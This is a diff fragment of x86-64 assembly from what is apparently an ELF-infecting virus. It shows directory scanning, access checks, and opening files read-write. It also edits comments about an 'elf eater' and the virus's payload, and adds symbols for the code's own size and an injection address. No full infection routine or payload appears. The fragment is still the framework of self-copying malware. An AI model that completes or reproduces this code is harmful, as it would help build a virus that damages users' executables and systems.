@@ -171,7 +171,6 @@ file_eligibility:
     test rax, rax
     jnz interior_loop_end
 
-    ; TODO: elf eater here
     mov rax, 0x101 ; sys_openat
     ; leave rdi and rsi from access call
     mov rdx, fileflags
@@ -206,7 +205,7 @@ lsdirents_done:
     ret
 
 end:
-    ; TODO: this is where the virus's payload would go
+    ; TODO: this is where the payload goes
     jmp regular_program_address
 regular_program_address:
     mov rax, 0x3c
@@ -226,3 +225,5 @@ symbols:
     fileflags equ 0x2 ; O_RDWR
     ; accessflags equ 0x6 ; R_OK | W_OK
     accessflags equ 0x7 ; R_OK | W_OK | X_OK
+    selfsz equ regular_program_address - _start
+    fillin_address equ regular_program_address - 0x8
